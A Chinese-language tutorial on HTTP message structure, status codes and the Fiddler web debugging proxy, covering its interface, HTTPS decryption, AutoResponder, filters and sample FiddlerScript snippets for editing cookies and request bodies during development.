一般协议是指计算机通信网络中两台计算机之间进行通信所必须共同遵守的规定或规则，超文本传输协议(HTTP)是一种通信协议，它允许将超文本标记语言(HTML)文档从Web服务器传送到客户端的浏览器，目前我们使用的是HTTP/1.1 版本。</p><p>​    <strong>URL详解</strong></p><p>​    URL(Uniform Resource Locator)地址用于描述一个网络上的资源, 基本格式如下：</p><p>​    <code>schema://host[:port#]/path/.../[?query-string][#anchor]</code></p><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">scheme</td><td style="text-align:center">指定低层使用的协议(例如：http, https, ftp)</td></tr><tr><td style="text-align:center">host</td><td style="text-align:center">HTTP服务器的IP地址或者域名</td></tr><tr><td style="text-align:center">port#</td><td style="text-align:center">HTTP服务器的默认端口是80，这种情况下端口号可以省略。如果使用了别的端口，必须指明，例如 <a href="http://www.test.com:8080/" target="_blank" rel="noopener">http://www.test.com:8080/</a></td></tr><tr><td style="text-align:center">path</td><td style="text-align:center">访问资源的路径</td></tr><tr><td style="text-align:center">query-string</td><td style="text-align:center">发送给http服务器的数据</td></tr><tr><td style="text-align:center">anchor</td><td style="text-align:center">锚</td></tr></tbody></table><p><strong>HTTP消息的结构</strong></p><ul><li>Request</li></ul><p><img src="http://ww1.sinaimg.cn/large/625782c8gw1elx0ltfr7mj20by05edg3.jpg" alt></p><p>先看Request 消息的结构, Request 消息分为3部分，第一部分叫Request line, 第二部分叫Request header, 第三部分是body. header和body之间有个空行.</p><p>第一行中的Method表示请求方法,比如”POST”,”GET”, Path-to-resoure表示请求的资源， Http/version-number 表示HTTP协议的版本号,当使用的是”GET” 方法的时候， body是为空的.</p><p><img src="http://ww1.sinaimg.cn/large/625782c8gw1emair58kcjj20in0kf78d.jpg" alt></p><ul><li>Response</li></ul><p><img src="http://ww3.sinaimg.cn/large/625782c8gw1elx0q9770cj20by05ewen.jpg" alt></p><p>再看Response消息的结构, 和Request消息的结构基本一样。 同样也分为三部分,第一部分叫Response line, 第二部分叫Response header，第三部分是body. header和body之间也有个空行.</p><p><img src="http://ww4.sinaimg.cn/large/625782c8gw1emair5tfn8j20k00ketf5.jpg" alt></p><h5 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h5><p>Response 消息中的第一行叫做状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。<br>状态码用来告诉HTTP客户端,HTTP服务器是否产生了预期的Response.<br>HTTP/1.1中定义了5类状态码， 状态码由三位数字组成，第一个数字定义了响应的类别。</p><table><thead><tr><th style="text-align:center">状态码</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">1XX</td><td style="text-align:center">提示信息，表示请求已被成功接收，继续处理</td></tr><tr><td style="text-align:center">2XX</td><td style="text-align:center">成功，表示请求已被成功接收，理解，接受</td></tr><tr><td style="text-align:center">3XX</td><td style="text-align:center">重定向，要完成请求必须进行更进一步的处理</td></tr><tr><td style="text-align:center">4XX</td><td style="text-align:center">客户端错误，请求有语法错误或请求无法实现</td></tr><tr><td style="text-align:center">5XX</td><td style="text-align:center">服务器端错误，服务器未能实现合法的请求</td></tr></tbody></table><ul><li>200 OK</li></ul><p>最常见的就是成功响应状态码200了， 这表明该请求被成功地完成，所请求的资源发送回客户端</p><ul><li>302 Found</li></ul><p>重定向，新的URL会在response 中的Location中返回，浏览器将会自动使用新的URL发出新的Request.例如在IE中输入， <a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a>. HTTP服务器会返回302， IE取到Response中Location header的新URL, 又重新发送了一个Request.</p><p><img src="http://ww3.sinaimg.cn/large/625782c8gw1emair6wcxyj20od0gs0xe.jpg" alt></p><ul><li>304 Not Modified</li></ul><p>代表上次的文档已经被缓存了， 还可以继续使用，例如打开博客园首页, 发现很多Response 的status code 都是304<br>[提示：　如果你不想使用本地缓存可以用Ctrl+F5 强制刷新页面]</p><p><img src="http://ww3.sinaimg.cn/mw690/625782c8gw1emair7mre2j20l40eugqe.jpg" alt></p><ul><li>400 Bad Request 客户端请求与语法错误，不能被服务器所理解</li><li>403 Forbidden 服务器收到请求，但是拒绝提供服务</li><li>404 Not Found</li></ul><p><img src="http://ww4.sinaimg.cn/mw690/625782c8gw1emair8nbagj20k50lsaek.jpg" alt></p><ul><li>500 Internal Server Error 服务器发生了不可预期的错误</li><li>503 Server Unavailable 服务器当前不能处理客户端的请求，一段时间后可能恢复正常</li></ul><h4 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h4><p>Fiddler的主界面分为 工具面板、会话面板、监控面板、状态面板，下面进行逐一进行介绍。</p><h5 id="工具面板"><a href="#工具面板" class="headerlink" title="工具面板"></a>工具面板</h5><p><img src="http://ww4.sinaimg.cn/large/625782c8gw1elq2p3w79lj20zd00w0tj.jpg" alt></p><ul><li>说明</li></ul><p>注释、重新请求、删除会话、继续执行、流模式/缓冲模式、解码、保留会话、监控指定进程、寻找、保存会话、切图、计时、打开浏览器、清除IE缓存、编码/解码工具、弹出控制监控面板、MSDN、帮助</p><ul><li>两种模式</li></ul><p>分为缓冲模式和流模式这两种。</p><p><strong>缓冲模式(Buffering Mode)</strong></p><p>Fiddler直到HTTP响应完成时才将数据返回给应用程序。可以控制响应，修改响应数据。但是时序图有时候会出现异常.</p><p><strong>流模式(Streaming Mode)</strong></p><p>Fiddler会即时将HTTP响应的数据返回给应用程序。更接近真实浏览器的性能。时序图更准确。但是不能控制响应.</p><p><img src="http://ww1.sinaimg.cn/mw690/625782c8gw1elqz09yarbj20n708zwf0.jpg" alt></p><h5 id="会话面板"><a href="#会话面板" class="headerlink" title="会话面板"></a>会话面板</h5><p><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234158609-143657944.png" alt></p><p>下面是会话面板横栏的含义：</p><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">#</td><td style="text-align:center">抓取HTTP Request的顺序，从1开始，以此递增</td></tr><tr><td style="text-align:center">Result</td><td style="text-align:center">HTTP状态码</td></tr><tr><td style="text-align:center">Protocol</td><td style="text-align:center">请求使用的协议，如HTTP/HTTPS/FTP等</td></tr><tr><td style="text-align:center">Host</td><td style="text-align:center">请求地址的主机名</td></tr><tr><td style="text-align:center">URL</td><td style="text-align:center">请求资源的位置</td></tr><tr><td style="text-align:center">Body</td><td style="text-align:center">该请求的大小</td></tr><tr><td style="text-align:center">Caching</td><td style="text-align:center">请求的缓存过期时间或者缓存控制值</td></tr><tr><td style="text-align:center">Content-Type</td><td style="text-align:center">请求响应的类型</td></tr><tr><td style="text-align:center">Process</td><td style="text-align:center">发送此请求的进程：进程ID</td></tr><tr><td style="text-align:center">Comments</td><td style="text-align:center">允许用户为此回话添加备注</td></tr><tr><td style="text-align:center">Custom</td><td style="text-align:center">允许用户设置自定义值</td></tr></tbody></table><p>会话面板左侧栏的图标含义：</p><table><thead><tr><th style="text-align:center">图标</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234159468-1047137951.gif" alt></td><td style="text-align:center">请求已经发往服务器</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234200047-1757509080.gif" alt></td><td style="text-align:center">已从服务器下载响应结果</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234201406-1416873112.gif" alt></td><td style="text-align:center">请求从断点处暂停</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234202375-1737717316.gif" alt></td><td style="text-align:center">响应从断点处暂停</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234202812-1354392122.gif" alt></td><td style="text-align:center">请求使用 HTTP 的 HEAD 方法，即响应没有内容（Body）</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234203515-1304170577.png" alt></td><td style="text-align:center">请求使用 HTTP 的 POST 方法</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234204531-965189067.gif" alt></td><td style="text-align:center">请求使用 HTTP 的 CONNECT 方法，使用 HTTPS 协议建立连接隧道</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234205547-1927498766.gif" alt></td><td style="text-align:center">响应是 HTML 格式</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234206203-722749081.gif" alt></td><td style="text-align:center">响应是一张图片</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234207000-575730385.gif" alt></td><td style="text-align:center">响应是脚本格式</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234207625-740567358.gif" alt></td><td style="text-align:center">响应是 CSS 格式</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234208297-916097140.gif" alt></td><td style="text-align:center">响应是 XML 格式</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234209640-1298497869.png" alt></td><td style="text-align:center">响应是 JSON 格式</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234210172-1709733575.png" alt></td><td style="text-align:center">响应是一个音频文件</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234210703-1810906238.png" alt></td><td style="text-align:center">响应是一个视频文件</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234211297-1181901939.png" alt></td><td style="text-align:center">响应是一个 SilverLight</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234213515-1617989240.png" alt></td><td style="text-align:center">响应是一个 FLASH</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234214140-838447913.png" alt></td><td style="text-align:center">响应是一个字体</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234214828-810550242.gif" alt></td><td style="text-align:center">普通响应成功</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234215406-1088186512.gif" alt></td><td style="text-align:center">响应是 HTTP/300、301、302、303 或 307 重定向</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234216015-2008519780.gif" alt></td><td style="text-align:center">响应是 HTTP/304（无变更）：使用缓存文件</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234216531-1803780843.gif" alt></td><td style="text-align:center">响应需要客户端证书验证</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234217078-1617370921.gif" alt></td><td style="text-align:center">服务端错误</td></tr><tr><td style="text-align:center"><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160119000324093-1538967179.gif" alt></td><td style="text-align:center">会话被客户端、Fiddler 或者服务端终止</td></tr></tbody></table><h5 id="监控面板"><a href="#监控面板" class="headerlink" title="监控面板"></a>监控面板</h5><p><img src="https://upload-images.jianshu.io/upload_images/947566-2a17b3b31567aae5.jpg" alt></p><ul><li><strong>统计报表</strong></li></ul><ol><li>请求总数、请求包大小、响应包大小；</li><li>请求起始时间、响应结束时间、握手时间、等待时间、路由时间、<code>TCP/IP</code>传输时间；</li><li><code>HTTP</code>状态码统计；</li><li>返回的各种类型数据的大小统计以及饼图展现。</li></ol><p><img src="http://ww2.sinaimg.cn/large/625782c8gw1elpm8svukoj215n0p0tf2.jpg" alt></p><ul><li><strong>时间轴</strong></li></ul><p>每个网络请求都会经历域名解析、建立连接、发送请求、接受数据等阶段。把多个请求以时间作为 X 轴，用图表的形式展现出来，就形成了瀑布图。在<code>Fiddler</code> 中，只要在左侧选中一些请求，右侧选择<code>Timeline</code>标签，就可以看到这些请求的瀑布图。</p><p><img src="http://ww3.sinaimg.cn/mw690/625782c8gw1elquvn14bbj20go05iweu.jpg" alt></p><p>初看上图，心中不免有几个问题？</p><ol><li>图标的 Y 轴上显示的是简化后的 URL。为什么有些是绿色的，有些是黑色的？</li><li>为什么第一个请求用阴影线来表示，其它请求却都是实心的？</li><li>请求条的不同颜色分别代表什么？</li><li>每个请求中的黑色竖线表示什么？</li><li>请求后面的图标（如闪电和软盘）代表了什么？</li><li>每个请求前面两个小圆圈是什么，为什么有的是红色，有的是绿色？</li></ol><p>答案是：</p><ol><li>绿色的请求表示这是一个“有条件的请求”。HTTP 协议定义了 5 个条件请求头部，最常见的两个是“If-Modified-Since”和“If-None-Match”。服务器根据这两个头部来验证本地缓存是否过期，如果过期则正常返回资源的最新版本；否则仅返回 304 Not Modified，浏览器继续使用本地缓存。包含条件请求头部的请求用绿色显示，否则用黑色。</li><li>有阴影线的请求是缓冲模式下的请求，实心的是流模式下的请求。Fiddler 提供了缓冲（Buffering）和流（Streaming）两种抓包模式：缓冲模式下，Fiddler 会在响应完成时才将数据返回给应用程序（通常是浏览器），这种模式下可以控制响应，方便地修改响应内容；流模式下，Fiddler 会实时返回响应数据给浏览器，但没办法控制响应。一般使用流模式，瀑布图会更真实一些。这两种模式可以通过 Fiddler 的工具栏选择。特别的，通过 Fiddler 的“AutoResponder”功能返回的响应，只能是缓冲模式。</li><li>请求条的不同颜色对应着不同类型的响应，根据响应头的 MIME Type 来归类。如浅绿色表示图片类型的响应；深绿色是 JavaScript；紫色是 CSS；其它都是蓝色。</li><li>请求中的黑色竖线，表示的是浏览器收到服务端响应的第一个字节这一时刻。这个时间受 DNS 解析、建立连接、发送请求、等待服务端响应等步骤的影响。</li><li>请求条后面的图标表示响应的某些特征。如软盘图标表示这个响应正文从本地获得，也就是说服务端返回了 304；闪电表示这是 Fiddler 的“AutoResponder”的响应；向下的箭头表示响应是 302，需要重定向；红色感叹号说明这个请求有错误发生（状态码是 4XX 或 5XX）。特别的，如果请求条后面有一个红色的X，说明服务端响应完这个请求之后，断开了连接。出现这种情况一般有两种可能：HTTP/1.0 的响应中没有 Connection: Keep-Alive；或者是 HTTP/1.1 的响应中包含了 Connection: close。使用持久连接可以省去建立连接的开销，也可以减小 TCP 慢启动和其它拥塞控制机制带来的影响，总之是好处多多。</li><li>请求前面的红色圆圈表示这个连接是新建的，绿色表示是复用的。上面的圆圈表示的是浏览器到 Fiddler 的连接，下面的圆圈是 Fiddler 到服务端的连接。</li></ol><h5 id="状态面板"><a href="#状态面板" class="headerlink" title="状态面板"></a>状态面板</h5><ul><li>控制台</li></ul><p>Fiddler的左下角有一个命令行工具叫做QuickExec,允许你直接输入命令。</p><p>常见的命令有：</p><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">help</td><td style="text-align:center">打开官方的使用页面介绍，所有的命令都会列出来</td></tr><tr><td style="text-align:center">cls</td><td style="text-align:center">清屏 (Ctrl+x 也可以清屏)</td></tr><tr><td style="text-align:center">select</td><td style="text-align:center">选择会话的命令</td></tr><tr><td style="text-align:center">?.png</td><td style="text-align:center">用来选择png后缀的图片</td></tr><tr><td style="text-align:center">bpu</td><td style="text-align:center">截获request</td></tr><tr><td style="text-align:center">bpafter</td><td style="text-align:center">截获response</td></tr></tbody></table><h4 id="Request消息的结构"><a href="#Request消息的结构" class="headerlink" title="Request消息的结构"></a>Request消息的结构</h4><p><img src="https://upload-images.jianshu.io/upload_images/947566-1733be471914d8af.png" alt></p><h4 id="Response消息的结构"><a href="#Response消息的结构" class="headerlink" title="Response消息的结构"></a>Response消息的结构</h4><p><img src="https://upload-images.jianshu.io/upload_images/947566-f94b5d9daa376a92.png" alt></p><h4 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h4><h5 id="监听https"><a href="#监听https" class="headerlink" title="监听https"></a>监听https</h5><p>Fiddler不仅能监听HTTP请求而且默认情况下也能捕获到HTTPS请求，Tool -> Fiddler Option -> HTTPS下面进行设置，勾选上“Decrypt HTTPS traffic”，如果不必监听服务器端得证书错误可以勾上“Ignore server certification errors”，也可以跳过几个指定的HOST来缩小或者扩大监听范围。</p><p><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160118234229250-1993071078.png" alt></p><h5 id="Host切换"><a href="#Host切换" class="headerlink" title="Host切换"></a>Host切换</h5><p>Tools->Hosts,</p><p><img src="http://ww2.sinaimg.cn/mw690/625782c8gw1elxmd4jcc3j20jd0ddn24.jpg" alt></p><h5 id="模拟各类场景"><a href="#模拟各类场景" class="headerlink" title="模拟各类场景"></a>模拟各类场景</h5><ul><li><p>通过GZIP压缩，测试性能</p></li><li><p>模拟Agent测试，查看服务端是否对不同客户端定制响应</p></li><li><p>模拟慢速网络，测试页面的容错性</p></li><li><p>禁用缓存，方便调试一些静态文件或测试服务端响应情况</p></li><li><p>根据一些场景自定义规则</p></li><li><p>低网速模拟</p><p>有时出于兼容性考虑或者对某处进行性能优化，在低网速下往往能较快发现问题所在也容易发现性能瓶颈，可惜其他调试工具没能提供低网速环境，而强大的Fiddler考虑到了这一点，能够进行低网速模拟设置Rules > Performance > Stimulate Modem Speeds。</p></li></ul><p><img src="http://ww4.sinaimg.cn/mw690/625782c8gw1elqyjdzz1aj212b0lcqbw.jpg" alt></p><h5 id="Compare-对比文本"><a href="#Compare-对比文本" class="headerlink" title="Compare(对比文本)"></a>Compare(对比文本)</h5><p>有时候两个请求比较相似，想找出区别，可以下载插件winziff，下载地址是</p><p><a href="http://www.grigsoft.com/download-windiff.htm，下载以后，放到tools-" target="_blank" rel="noopener">http://www.grigsoft.com/download-windiff.htm，下载以后，放到tools-</a> fiddler option tool文件夹下，</p><p>设置好路径就可以使用了。</p><p><img src="http://ww4.sinaimg.cn/mw690/625782c8gw1elqvkwthjgj20uf0n1jw8.jpg" alt></p><h5 id="Composer-构造器"><a href="#Composer-构造器" class="headerlink" title="Composer(构造器)"></a>Composer(构造器)</h5><p>​        请求构造顾名思义就是我们可以模拟请求，也就是说我们可以借助Fiddler的Composer 在不改动开发环境实际代码的情况下修改请求中的参数值并且方便的重新调用一次该请求，然后相比较2次请求响应有何具体不同。任何一个请求参数只要是合法的取值再次调用后都会有相应的响应，那么你想要的任意一个合法请求组合自然也能够按照你的意愿构造出来，然后再次调用以及查看返回数据，十分方便！</p><p>​    Composer允许自定义请求发送到服务器，可以手动创建一个新的请求，也可以在会话表中，拖拽一个现有的请求，Parsed模式下你只需要提供简单的URLS地址即可（也可以在RequestBody定制一些属性，如模拟浏览器User-Agent）。</p><h5 id="Filters-过滤监控"><a href="#Filters-过滤监控" class="headerlink" title="Filters(过滤监控)"></a>Filters(过滤监控)</h5><p>​        对一个重新载入的页面进行抓包，如果包的条目过多而你需要关注的就那么几项的话，可以使用Fiddler的过滤器Filters进行抓包，那么抓包时只会抓取你希望抓到的那些包。切换到Filters标签勾选Use filter，以便激活过滤器，这样下面的各种过滤方式就可以进行选择了。</p><ul><li><p><img src="http://ww3.sinaimg.cn/mw690/625782c8gw1elqxfq4wl8j20gi06ljsd.jpg" alt></p></li><li></li></ul><p><img src="http://ww4.sinaimg.cn/mw690/625782c8gw1elqxfps7xwj20e404074n.jpg" alt></p><table><thead><tr><th style="text-align:center">选项1</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">No zone filter</td><td style="text-align:center">不设置hosts过滤</td></tr><tr><td style="text-align:center">Show Only Intranet Hosts</td><td style="text-align:center">只显示内网HOST</td></tr><tr><td style="text-align:center">Show Only Internet Hosts</td><td style="text-align:center">只显示外网HOST</td></tr></tbody></table><table><thead><tr><th style="text-align:center"><strong>选项2</strong></th><th style="text-align:center"><strong>解释</strong></th></tr></thead><tbody><tr><td style="text-align:center">No Host Filter</td><td style="text-align:center">不设置hosts过滤</td></tr><tr><td style="text-align:center">Hide The Following Hosts</td><td style="text-align:center">隐藏过滤到的域名</td></tr><tr><td style="text-align:center">Show Only The Following Hosts</td><td style="text-align:center">只显示过滤到的域名</td></tr><tr><td style="text-align:center">Flag The Following Hosts</td><td style="text-align:center">标记过滤到的域名</td></tr></tbody></table><h5 id="AutoResponder-请求重定向"><a href="#AutoResponder-请求重定向" class="headerlink" title="AutoResponder(请求重定向)"></a>AutoResponder(请求重定向)</h5><p>所谓请求无非就是需要调用到的一些资源(包括JS、CSS和图片等)，所谓重定向就是将页面原本需要调用的资源指向其他资源(你能够控制的资源或者可以引用到的资源)。</p><p>(1)你可以将前台服务器的诸多或者某个资源在本地做个副本，如果正常网络访问环境下该资源出现了BUG而导致开发环境崩溃时，可以先将这个资源的请求重定向到本地副本，这样就可以继续进行开发调试你的页面，从而大量节省资源维护的等待时间。</p><p>(2)你也可以将多人同时维护的某个JS文件复制一份出来在本地，当你的开发调试收到他人调试代码干扰时，可以将这个JS的调用重定向到本地无干扰的JS文件，进行无干扰开发，功能开发完成并调试OK之后再将你的代码小心合入到开发环境中，这样就可以避免受到他人干扰专心搞你的模块开发，也就是说能够将JS文件脱离开发环境却不影响线上调试。</p><p>(3)你还可以将样式文件或者图片指向本地如果需要的话。开发过程中的很多页面其实都是惨不忍睹的，究其原因很大程度上是因为缺少对应的样式文件或者没有图片资源，所以样式文件和图片的重定向会对美感稍有要求的开发人员带来福音。</p><p><img src="http://ww4.sinaimg.cn/mw690/625782c8gw1elqy1v4k8qj20ds051my1.jpg" alt></p><h4 id="插件介绍"><a href="#插件介绍" class="headerlink" title="插件介绍"></a>插件介绍</h4><h5 id="Format"><a href="#Format" class="headerlink" title="Format"></a>Format</h5><p><img src="http://ww1.sinaimg.cn/mw690/625782c8gw1elxlq1u81sj20nj0akdp3.jpg" alt></p><h5 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h5><ul><li>Fiddler Script 是用JScript.NET语言写的，<a href="http://msdn.microsoft.com/zh-cn/library/cc435359(VS.71" target="_blank" rel="noopener">JScript.NET</a>.aspx)</li><li>在这个方法中修改Request的内容， 我们用得最多,</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">OnBeforeRequest</span>(<span class="params">oSession: Session</span>)</span></span><br></pre></td></tr></tbody></table></figure><ul><li>在这个方法中修改修改Response的内容</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">OnBeforeResponse</span>(<span class="params">oSession: Session</span>)</span></span><br></pre></td></tr></tbody></table></figure><ul><li>在IP Main方法中添加</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FiddlerObject.UI.lvSessions.AddBoundColumn(<span class="string">"HostIP"</span>, <span class="number">50</span>, <span class="string">"x-hostIP"</span>);</span><br></pre></td></tr></tbody></table></figure><ul><li>请求，响应延迟 在OnBeforeRequest 添加</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oSession[<span class="string">"request-trickle-delay"</span>]  = <span class="string">"3000"</span>; </span><br><span class="line">oSession[<span class="string">"response-trickle-delay"</span>] = <span class="string">"3000"</span>;</span><br></pre></td></tr></tbody></table></figure><ul><li>我们可以控制Session在Fiddler中显示的样式，把这段脚本放在OnBeforeRequest(oSession: Session) 方法下，并且点击”Save script”, 这样所有的cnblogs的会话都会显示红色.</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (oSession.HostnameIs(<span class="string">"www.cnblogs.com"</span>)) {</span><br><span class="line">           oSession[<span class="string">"ui-color"</span>] = <span class="string">"red"</span>;</span><br><span class="line">       }</span><br></pre></td></tr></tbody></table></figure><ul><li>Fiddler Script中修改Cookie<br>Cookie其实就是request 中的一个header,注意:FiddlerScript不能直接删除或者编辑单独的一个cookie， 你需要用replace方法或者正则表达式的方法去操作cookie的string</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">OnBeforeRequest</span>(<span class="params">oSession: Session</span>) </span></span><br><span class="line"><span class="function"></span>{ </span><br><span class="line">     <span class="keyword">if</span> (oSession.HostnameIs(<span class="string">'www.example.com'</span>)</span><br><span class="line">       && oSession.uriContains(<span class="string">'pagewithCookie'</span>) </span><br><span class="line">       && oSession.oRequest.headers.Contains(<span class="string">"Cookie"</span>)) </span><br><span class="line">     { </span><br><span class="line">         <span class="keyword">var</span> sCookie = oSession.oRequest[<span class="string">"Cookie"</span>]; </span><br><span class="line">         </span><br><span class="line">         <span class="comment">// 用replace方法或者正则表达式的方法去操作cookie的string</span></span><br><span class="line">         sCookie = sCookie.Replace(<span class="string">"cookieName="</span>, <span class="string">"ignoreme="</span>); </span><br><span class="line">         oSession.oRequest[<span class="string">"Cookie"</span>] = sCookie; </span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><ul><li>删除所有的cookie</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oSession.oRequest.headers.Remove(<span class="string">"Cookie"</span>);</span><br></pre></td></tr></tbody></table></figure><ul><li>新建cookie</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oSession.oRequest.headers.Add(<span class="string">"Cookie"</span>, <span class="string">"username=testname;testpassword=P@ssword1"</span>);</span><br></pre></td></tr></tbody></table></figure><ul><li>Fiddler Script中修改Request 中的body</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">OnBeforeRequest</span>(<span class="params">oSession: Session</span>) </span></span><br><span class="line"><span class="function"></span>{ </span><br><span class="line">    <span class="keyword">if</span>(oSession.uriContains(<span class="string">"http://www.cnblogs.com/"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 获取Request中的body字符串</span></span><br><span class="line">        <span class="keyword">var</span> strBody=oSession.GetRequestBodyAsString();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 用正则表达式或者replace方法去修改string</span></span><br><span class="line">        strBody=strBody.replace(<span class="string">"1111"</span>,<span class="string">"2222"</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 弹个对话框检查下修改后的body               </span></span><br><span class="line">        FiddlerObject.alert(strBody);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将修改后的body，重新写回Request中</span></span><br><span class="line">        oSession.utilSetRequestBody(strBody);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><a href="https://visualstudiogallery.msdn.microsoft.com/872d27ee-38c7-4a97-98dc-0d8a431cc2ed" target="_blank" rel="noopener">Vs插件</a></p><h5 id="三方插件"><a href="#三方插件" class="headerlink" title="三方插件"></a>三方插件</h5><ul><li>.NET可以开发</li><li>插件管理</li></ul><p><img src="http://ww1.sinaimg.cn/mw690/625782c8gw1elxmgvvx07j20fi0ad77q.jpg" alt></p><p>可供Fiddler使用的第三方插件地址如下：<br><a href="http://pan.baidu.com/s/1mgocpBi" target="_blank" rel="noopener">http://pan.baidu.com/s/1mgocpBi</a><br><a href="http://fiddler.com/add-ons" target="_blank" rel="noopener">http://fiddler.com/add-ons</a></p><h4 id="浏览器抓包方式"><a href="#浏览器抓包方式" class="headerlink" title="浏览器抓包方式"></a>浏览器抓包方式</h4><h5 id="IE"><a href="#IE" class="headerlink" title="IE"></a>IE</h5><p><img src="http://ww3.sinaimg.cn/large/625782c8gw1elxk7795z1j20mv0k9n1s.jpg" alt></p><h5 id="FireFox"><a href="#FireFox" class="headerlink" title="FireFox"></a>FireFox</h5><p><img src="http://ww4.sinaimg.cn/large/625782c8gw1elxk76hc62j20v00cudl8.jpg" alt></p><h5 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h5><p><img src="http://ww2.sinaimg.cn/large/625782c8gw1elxk75frokj20hx0f6ac4.jpg" alt></p><h5 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h5><p>我们会用Visual Studio来开发ASP.NET网站的时候也需要用Fiddler来分析HTTP, 默认的时候Fiddler是不能嗅探到localhost的网站。在localhost后面加个点号，Fiddler就能嗅探到。</p><p>例如：原本ASP.NET的地址是 <a href="http://localhost:2391/Default.aspx，" target="_blank" 